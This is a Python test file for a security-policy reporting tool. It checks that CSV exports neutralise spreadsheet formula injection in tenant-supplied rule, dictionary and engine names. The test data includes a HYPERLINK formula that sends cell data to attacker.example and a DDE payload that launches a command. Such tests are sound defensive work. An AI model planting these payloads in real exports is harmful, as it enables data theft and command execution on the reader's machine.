"""CSV exports never hand a spreadsheet a formula taken from the tenant.

Rule, dictionary and engine names are set by ZIA admins. A name such as
=HYPERLINK(...) must reach the auditor's Excel as text, not as a formula.
Fake clients only; no tenant is called.
"""
from __future__ import annotations

import ast
import csv
import io
from pathlib import Path

import bypass_report as br
import csv_safe
import dlp_efficacy
import rule_migrator
import ssl_flow as sf

ROOT = Path(__file__).resolve().parents[1]
FORMULA = '=HYPERLINK("http://attacker.example/?d="&A1,"Click")'
DDE = "+cmd|' /C calc'!A0"
TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


class FakeCl:
    def __init__(self, routes):
        self.routes = routes

    def get(self, endpoint, params=None):
        if endpoint in self.routes:
            return self.routes[endpoint], 200
        return {"error": "not found"}, 404


def _cells(text):
    return [c for row in csv.reader(io.StringIO(text)) for c in row]


def _assert_no_formula(text, *expected):
    cells = _cells(text)
    bad = [c for c in cells if c[:1] in TRIGGERS]
    assert not bad, bad
    for e in expected:
        assert "'" + e in cells, (e, cells)


def test_safe_cell_quotes_formula_starts_and_keeps_plain_values():
    for s in (FORMULA, DDE, "-2+3", "@SUM(A1)", "\tx", "\rx"):
        assert csv_safe.safe_cell(s) == "'" + s
    for v in ("Block SSN", "", "-5", "+1.5", "3e4", 7, -3, None, 1.5):
        assert csv_safe.safe_cell(v) == v


def test_bypass_report_csv_quotes_tenant_rule_names_and_descriptions():
    rule = {"id": 1, "name": FORMULA, "order": 1, "state": "ENABLED", "description": DDE,
            "action": "ALLOW", "urls": ["example.com"]}
    ssl = {"id": 2, "name": FORMULA, "order": 1, "state": "ENABLED", "action": {"type": "DO_NOT_DECRYPT"}, "urls": ["bank.example"]}
    dlp = {"id": 3, "name": FORMULA, "order": 1, "state": "ENABLED", "action": "ALLOW", "description": DDE}
    cl = FakeCl({"/zia/urlFilteringRules": [rule], "/zia/sslInspectionRules": [ssl], "/zia/webDlpRules": [dlp]})
    rep = br.generate_bypass_report(cl)
    text = br.to_csv(rep)
    _assert_no_formula(text, FORMULA, DDE)


def test_ssl_flow_csv_quotes_decided_by_and_dlp_rule_names():
    ssl = [{"id": 1, "name": FORMULA, "order": 1, "state": "ENABLED", "action": {"type": "DECRYPT"}}]
    dlp = [{"id": 2, "name": FORMULA, "order": 1, "state": "ENABLED", "action": "BLOCK", "dlp_engines": [{"id": 1}]}]
    rep = sf.generate_ssl_flow_report(FakeCl({"/zia/sslInspectionRules": ssl, "/zia/webDlpRules": dlp}))
    text = sf.to_csv(rep)
    rows = list(csv.DictReader(io.StringIO(text)))
    assert rows and any(r["decided_by"] == "'" + FORMULA for r in rows)
    assert any(r["dlp_rules"].startswith("'" + FORMULA) for r in rows)
    _assert_no_formula(text)


def test_rule_migrator_csv_quotes_rule_names():
    text = rule_migrator.export_rules([{"id": 1, "name": FORMULA, "action": "BLOCK"}], format="csv")
    rows = list(csv.DictReader(io.StringIO(text)))
    assert rows[0]["Name"] == "'" + FORMULA
    _assert_no_formula(text)


def test_efficacy_csv_quotes_dictionary_and_engine_names():
    analysis = {"dictionaries": [{"id": 1, "name": FORMULA, "type": "CUSTOM", "reasons": [DDE]}],
                "engines": [{"id": 2, "name": "@SUM(1+1)*cmd|' /C calc'!A0"}]}
    text = dlp_efficacy.export_csv(analysis).decode("utf-8")
    rows = list(csv.DictReader(io.StringIO(text)))
    assert rows[0]["name"] == "'" + FORMULA and rows[0]["reasons"] == "'" + DDE
    assert rows[1]["name"].startswith("'@")
    _assert_no_formula(text)


def test_every_csv_writer_in_the_app_goes_through_csv_safe():
    offenders = []
    for path in ROOT.glob("*.py"):
        if path.name == "csv_safe.py":
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Attribute) and node.attr in ("writer", "DictWriter") \
                    and isinstance(node.value, ast.Name) and node.value.id in ("csv", "_csv"):
                offenders.append(f"{path.name}:{node.lineno}")
    assert not offenders, offenders
